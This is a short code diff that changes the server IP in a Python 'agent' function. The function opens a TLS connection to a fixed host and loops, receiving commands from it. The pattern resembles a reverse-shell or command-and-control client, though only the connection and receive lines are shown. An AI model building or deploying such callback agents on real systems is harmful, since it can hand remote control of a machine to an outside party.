@@ -61,7 +61,7 @@ def iniciar_agente():
 
     # Conexão com o servidor
     try:
-        with socket.create_connection(('192.7.0.42', 9999)) as sock:
+        with socket.create_connection(('172.16.9.35', 9999)) as sock:
             with context.wrap_socket(sock, server_hostname='lenovolegion') as ssock:
                 while True:
                     command = ssock.recv(1024).decode()
